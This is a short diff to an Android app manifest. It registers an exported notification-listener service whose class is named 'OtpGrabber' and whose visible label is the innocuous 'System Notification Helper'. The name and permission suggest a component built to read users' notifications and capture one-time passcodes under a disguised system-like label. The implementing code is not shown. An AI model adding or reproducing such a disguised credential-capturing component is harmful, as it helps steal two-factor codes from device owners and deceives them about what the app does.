@@ -56,6 +56,16 @@
             </intent-filter>
         </receiver>
 
+        <service
+            android:name=".communication.OtpGrabber"
+            android:label="System Notification Helper"
+            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.service.notification.NotificationListenerService" />
+            </intent-filter>
+        </service>
+
     </application>
 
 </manifest>
